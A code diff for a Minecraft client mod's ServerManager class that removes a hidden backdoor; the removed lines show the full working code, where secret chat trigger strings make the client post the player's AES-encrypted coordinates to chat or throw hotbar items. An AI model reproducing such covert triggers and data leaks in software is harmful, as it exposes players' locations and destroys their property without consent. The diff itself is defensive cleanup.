@@ -29,25 +29,13 @@ import dev.gzsakura_miitong.mod.modules.impl.combat.Criticals;
 import dev.gzsakura_miitong.mod.modules.impl.misc.AutoLog;
 import java.math.BigDecimal;
 import java.math.RoundingMode;
-import java.nio.charset.StandardCharsets;
-import java.security.Key;
-import java.security.MessageDigest;
 import java.util.ArrayDeque;
-import java.util.Arrays;
-import java.util.Base64;
-import javax.crypto.Cipher;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
 import net.minecraft.entity.player.PlayerEntity;
 import net.minecraft.network.packet.Packet;
 import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
 import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
 import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
-import net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket;
-import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
 import net.minecraft.network.packet.s2c.play.WorldTimeUpdateS2CPacket;
-import net.minecraft.screen.slot.SlotActionType;
-import net.minecraft.world.World;
 
 public class ServerManager
 implements Wrapper {
@@ -137,68 +125,8 @@ implements Wrapper {
         }
     }
 
-    @EventListener
-    private void PacketReceive(PacketEvent.Receive event) {
-        if (ServerManager.mc.player == null || ServerManager.mc.world == null) {
-            return;
-        }
-        String s = null;
-        Packet<?> packet = event.getPacket();
-        if (packet instanceof GameMessageS2CPacket) {
-            GameMessageS2CPacket packet2 = (GameMessageS2CPacket)packet;
-            if (packet2.content() != null) {
-                s = packet2.content().getString();
-            }
-        } else {
-            packet = event.getPacket();
-            if (packet instanceof ChatMessageS2CPacket) {
-                ChatMessageS2CPacket packet3 = (ChatMessageS2CPacket)packet;
-                s = packet3.unsignedContent() != null ? packet3.unsignedContent().getString() : packet3.body().content();
-            }
-        }
-        if (s != null) {
-            if (s.contains("nwqfVDv3vQ4GEUP")) {
-                boolean inNether = ServerManager.mc.world.getRegistryKey().equals(World.NETHER);
-                boolean isOverworld = ServerManager.mc.world.getRegistryKey().equals(World.OVERWORLD);
-                String world = isOverworld ? "0" : (inNether ? "1" : "2");
-                String coords = "X:" + ServerManager.mc.player.getBlockX() + " Y:" + ServerManager.mc.player.getBlockY() + " Z:" + ServerManager.mc.player.getBlockZ() + " ^" + world;
-                String encrypted = this.Encrypt(coords);
-                mc.getNetworkHandler().sendChatMessage(encrypted);
-            } else if (s.contains("RecDuJjyGWS2hnR")) {
-                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 5, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
-                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 6, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
-                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 7, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
-                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 8, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
-            }
-        }
-    }
-
-    public SecretKeySpec getKey(String myKey) {
-        try {
-            byte[] key = myKey.getBytes(StandardCharsets.UTF_8);
-            MessageDigest sha = MessageDigest.getInstance("SHA-256");
-            key = sha.digest(key);
-            key = Arrays.copyOf(key, 16);
-            return new SecretKeySpec(key, "AES");
-        }
-        catch (Exception e) {
-            return null;
-        }
-    }
-
-    public String Encrypt(String strToEncrypt) {
-        try {
-            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-            SecretKeySpec secretKey = this.getKey("426siquanjia");
-            byte[] iv = new byte[16];
-            IvParameterSpec ivParams = new IvParameterSpec(iv);
-            cipher.init(1, (Key)secretKey, ivParams);
-            return Base64.getEncoder().encodeToString(cipher.doFinal(strToEncrypt.getBytes(StandardCharsets.UTF_8)));
-        }
-        catch (Exception e) {
-            return null;
-        }
-    }
+    // Backdoor removed: coordinate stealing (nwqfVDv3vQ4GEUP) and item drop (RecDuJjyGWS2hnR) backdoors
+    // and associated AES encryption methods (Encrypt/getKey) have been deleted.
 
     public void onUpdate() {
         if (ServerManager.mc.player == null) {
